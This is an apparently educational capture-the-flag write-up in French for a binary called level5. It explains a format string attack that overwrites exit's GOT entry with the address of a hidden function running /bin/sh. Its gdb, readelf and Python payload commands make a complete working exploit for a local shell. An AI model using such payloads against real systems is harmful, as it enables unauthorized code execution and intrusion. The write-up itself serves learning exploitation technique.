Si on disass notre executable il call printf avec notre input et utilise exit pour terminer le programme.
On remarque aussi que une fonction est presente mais n'est pas appeler, la fonction o execute un appel system avec comme argument /bin/sh.
On en deduit qu'il va falloir detourner notre executable afin qu'il lance la fonction qui n'est pas utiliser ( la fonction o )

Vu que notre input est directement utiliser par printf nous pouvons effectuer un format string attack,
mais contrairement a l'exercice d'avant nous ne pouvons pas utiliser le retour de la fonction pour l'exploit car la fonction se termine avant avec l'appel de exit()
Cepedant l'executable utilise des 'dynamic link' et une faille est possible en ecrasant la valeur de notre relocation (effectuer par plt) de la fonction exit. on va donc chercher a remplacer la valeur de notre GOT ( global offset table ) qui contient l'adresse pour executer exit().
Si on remplace l'adresse par celle de notre fonction o, Notre fonction sera donc executer quand un appel a exit.plt sera effectuer.

Pour obtenir les differentes adresses:
Dans gdb:
--> info functions
- 0x080484a4  o

et pour avoir l'emplacement de la relocation on utilise readelf
--> readelf -r ./level5
- 08049838  00000607 R_386_JUMP_SLOT   00000000   exit

Pour recapituler nous devons donc ecrire 0x080484a4 (o) dans 08049838 (reloc)
0x080484a4 en decimal vaut 134513828

comme dans l'ancien exercice on utilise %p pour trouver l'emplacement de notre format string dans la stack

--> python -c "print('AAAA' + ' %p'*10)" | ./level5
- AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520

Notre string 'AAAA' est le 4eme element.
Nous pouvons donc pointer dessus de cette maniere '%4\%p'
--> python -c "print('AAAA' + ' %4\$p')" | ./level5
- AAAA 0x41414141

Cela fonctionne correctement il nous reste donc a tous assembler, c'est a dire ecrire notre adresse 0x08049838 (reloc) notre nombre 0x080484a4 (o) en utilisant le %n de printf. ( attention a bien faire -4 a notre valeur car l'adresse que nous ecrivont avant vaut 4 soit 134513824 )
--> python -c "print('\x38\x98\x04\x08' + '%134513824d' + ' %4\$n')" | ./level5
Il ne se passe rien car notre appel system se fini directement, il faut donc garder le stdin ouvert afin de pouvoir interagir avec notre sh qui est executer !

--> (python -c "print('\x38\x98\x04\x08' + '%134513824d' + ' %4\$n')" ; cat) | ./level5
